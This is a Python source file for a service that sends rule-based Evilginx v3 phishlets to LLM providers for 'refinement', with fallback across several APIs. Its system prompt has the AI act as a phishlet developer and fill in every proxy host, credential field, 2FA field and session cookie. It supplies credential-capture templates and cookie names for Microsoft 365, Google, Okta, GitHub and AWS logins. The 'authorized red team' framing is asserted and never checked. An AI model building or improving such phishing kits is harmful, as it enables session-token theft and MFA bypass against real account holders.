import json
import logging
from typing import Optional, Literal
from enum import Enum

import litellm

from app.config import settings
from app.schemas.phishlet import Phishlet
from app.schemas.analysis import AnalysisResult

logger = logging.getLogger(__name__)

SYSTEM_PROMPT = """You are an expert Evilginx v3 phishlet developer for authorized red team security testing.
You understand the Evilginx v3 phishlet YAML format thoroughly, including:
- proxy_hosts: All domains and subdomains involved in authentication
- auth_tokens: Session cookies that identify authenticated users
- credentials: Form fields for username/password/2FA
- auth_urls: Endpoints that perform authentication
- login: Entry point URL
- force_post: POST requests with field extraction and optional value forcing
- js_inject: JavaScript injections for SPA/dynamic auth
- sub_filters: Cross-domain cookie/header modifications

Given a rule-based phishlet draft and analysis data, improve it by:
1. Identifying ALL missing proxy_hosts (every domain/subdomain involved)
2. Adding COMPLETE force_post entries with all form fields and search patterns
3. Suggesting correct auth_token cookie names for the platform
4. Mapping ALL credential fields (username, password, 2FA codes)
5. Adding sub_filters for cross-domain scenarios
6. Adding force_post for every auth endpoint detected
7. Adding js_inject if the site uses SPA/JavaScript authentication
8. Ensuring NO fields are left empty - every section complete

Return ONLY a valid JSON object matching the Phishlet schema. No explanations."""

KNOWN_PLATFORMS_HINT = """
Known platform patterns with COMPLETE force_post examples:

MICROSOFT 365/AZURE:
- Domains: login.microsoftonline.com, login.live.com, microsoft.com
- Cookies: ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie, ESTSAUTHLIGHT
- force_post example:
  - path: '/common/login'
    force:
      - key: 'loginfmt'
        get: true
        value: '{{ .username }}'
      - key: 'passwd'
        get: true
        value: '{{ .password }}'
      - key: 'flowToken'
        get: true
        value: ''
    search:
      - {key: 'loginfmt', search: '(.*)'}
      - {key: 'passwd', search: '(.*)'}
      - {key: 'flowToken', search: '(.*)'}
    type: 'post'

GOOGLE:
- Domains: accounts.google.com, google.com
- Cookies: SID, HSID, SSID, __Secure-1PSID
- force_post:
  - path: '/signin/identifier'
    force:
      - key: 'identifier'
        get: true
        value: '{{ .username }}'
    search:
      - {key: 'identifier', search: '(.*)'}
    type: 'post'

OKTA:
- Domains: okta.com
- Cookies: sid, idx, okta-oauth-nonce
- force_post:
  - path: '/api/v1/authn'
    force:
      - key: 'username'
        get: true
        value: '{{ .username }}'
      - key: 'password'
        get: true
        value: '{{ .password }}'
    search:
      - {key: 'username', search: '(.*)'}
      - {key: 'password', search: '(.*)'}
    type: 'post'

GITHUB:
- Domains: github.com
- Cookies: user_session, _gh_sess, logged_in
- force_post:
  - path: '/session'
    force:
      - key: 'login'
        get: true
        value: '{{ .username }}'
      - key: 'password'
        get: true
        value: '{{ .password }}'
    search:
      - {key: 'login', search: '(.*)'}
      - {key: 'password', search: '(.*)'}
    type: 'post'

AWS:
- Domains: signin.aws.amazon.com
- Cookies: aws-creds, aws-userInfo, aws-signer-token
- force_post:
  - path: '/ap/signin'
    force:
      - key: 'email'
        get: true
        value: '{{ .username }}'
      - key: 'password'
        get: true
        value: '{{ .password }}'
    search:
      - {key: 'email', search: '(.*)'}
      - {key: 'password', search: '(.*)'}
    type: 'post'"""


class AIProvider(str, Enum):
    GROQ = "groq"
    ANTHROPIC = "anthropic"
    OPENAI = "openai"
    AZURE = "azure"
    GOOGLE = "google"
    DEEPSEEK = "deepseek"


class AIService:
    def __init__(self):
        self.ai_enabled = settings.ai_enabled
        self.timeout = settings.ai_timeout
        self.max_retries = settings.ai_max_retries
        self.provider_order = settings.ai_provider_order
        self.api_keys = settings.ai_api_keys

    async def refine_phishlet(
        self, phishlet: Phishlet, analysis: AnalysisResult
    ) -> Optional[Phishlet]:
        """Refine phishlet using AI with automatic provider fallback"""
        if not self.ai_enabled:
            return None

        phishlet_json = phishlet.model_dump_json(indent=2)
        analysis_summary = self._build_analysis_summary(analysis)

        user_prompt = f"""Here is a rule-based phishlet draft and complete analysis data.
Refine the phishlet to be COMPLETE with NO empty fields.

## Current Phishlet Draft
```json
{phishlet_json}
```

## Target Analysis
{analysis_summary}

## Known Platform Patterns & Examples
{KNOWN_PLATFORMS_HINT}

## Requirements
1. ENSURE ALL force_post entries are COMPLETE with:
   - path: correct authentication endpoint
   - force: ALL form fields with values
   - search: regex patterns to extract values
   - type: 'post' or 'get'
2. ENSURE auth_tokens lists ALL session cookies
3. ENSURE credentials maps ALL form fields
4. ENSURE proxy_hosts includes ALL domains
5. NO empty arrays or null values
6. force_post.force and force_post.search must match field counts

Return ONLY valid JSON - no explanations."""

        for provider in self.provider_order:
            try:
                api_key = self.api_keys.get(provider)
                if not api_key:
                    logger.debug(f"Skipping {provider}: no API key")
                    continue

                logger.info(f"Attempting AI refinement with {provider}")
                refined = await self._call_ai_provider(provider, api_key, user_prompt)
                if refined:
                    logger.info(f"Successfully refined phishlet using {provider}")
                    return refined
            except Exception as e:
                logger.warning(f"AI refinement failed with {provider}: {e}")
                continue

        logger.warning("All AI providers failed")
        return None

    async def _call_ai_provider(
        self, provider: str, api_key: str, user_prompt: str
    ) -> Optional[Phishlet]:
        """Call specific AI provider"""
        model_map = {
            "groq": "groq/mixtral-8x7b-32768",
            "anthropic": "claude-3-5-sonnet-20241022",
            "openai": "gpt-4o",
            "azure": "azure/gpt-4o",
            "google": "gemini-2.0-flash",
            "deepseek": "deepseek/deepseek-chat",
        }
        
        model = model_map.get(provider)
        if not model:
            return None

        try:
            response = await litellm.acompletion(
                model=model,
                api_key=api_key,
                messages=[
                    {"role": "system", "content": SYSTEM_PROMPT},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=0.1,
                max_tokens=4000,
                timeout=self.timeout,
                retries=self.max_retries,
            )

            content = response.choices[0].message.content

            if "```json" in content:
                content = content.split("```json")[1].split("```")[0]
            elif "```" in content:
                content = content.split("```")[1].split("```")[0]

            refined_data = json.loads(content.strip())
            refined_phishlet = Phishlet.model_validate(refined_data)
            return refined_phishlet

        except Exception as e:
            logger.debug(f"Error with {provider}: {e}")
            raise

    def _build_analysis_summary(self, analysis: AnalysisResult) -> str:
        """Build comprehensive analysis summary"""
        domains = ", ".join([d.domain for d in analysis.discovered_domains])
        cookies_text = ""
        for domain, names in analysis.cookies_observed.items():
            cookies_text += f"  {domain}: {', '.join(names)}\n"

        forms_text = ""
        for i, form in enumerate(analysis.login_forms, 1):
            fields = ", ".join([f"{f.field_name} ({f.field_type})" for f in form.fields])
            forms_text += f"  Form {i}: {form.action_url} [{fields}]\n"

        auth_endpoints = ", ".join(analysis.auth_api_endpoints[:20])

        return f"""Target URL: {analysis.target_url}
Base Domain: {analysis.base_domain}
Domains: {domains}

Cookies Observed:
{cookies_text}

Forms:
{forms_text}

Auth Endpoints:
{auth_endpoints}

Info:
- MFA: {analysis.has_mfa}
- JS Auth: {analysis.uses_javascript_auth}
- Post-Login URL: {analysis.post_login_url or 'Not detected'}
- Auth Type: {analysis.auth_type or 'Unknown'}
- Hidden Fields: {len(analysis.hidden_fields)}
"""

    async def check_connection(self, provider: Optional[str] = None) -> bool:
        """Test connection to AI provider"""
        providers = [provider] if provider else self.provider_order
        model_map = {
            "groq": "groq/mixtral-8x7b-32768",
            "anthropic": "claude-3-5-sonnet-20241022",
            "openai": "gpt-4o",
            "azure": "azure/gpt-4o",
            "google": "gemini-2.0-flash",
            "deepseek": "deepseek/deepseek-chat",
        }

        for prov in providers:
            try:
                api_key = self.api_keys.get(prov)
                if not api_key:
                    continue

                model = model_map.get(prov)
                if not model:
                    continue

                await litellm.acompletion(
                    model=model,
                    api_key=api_key,
                    messages=[{"role": "user", "content": "Reply with 'ok'"}],
                    max_tokens=5,
                    timeout=10,
                )
                logger.info(f"AI provider {prov} is online")
                return True
            except Exception as e:
                logger.debug(f"Provider {prov} check failed: {e}")

        logger.warning("No AI providers available")
        return False

    def get_available_providers(self) -> list[str]:
        """Get configured providers"""
        return [p for p in self.provider_order if self.api_keys.get(p)]

    def get_status(self) -> dict:
        """Get AI service status"""
        return {
            "ai_enabled": self.ai_enabled,
            "available_providers": self.get_available_providers(),
            "primary_provider": self.provider_order[0] if self.provider_order else None,
        }
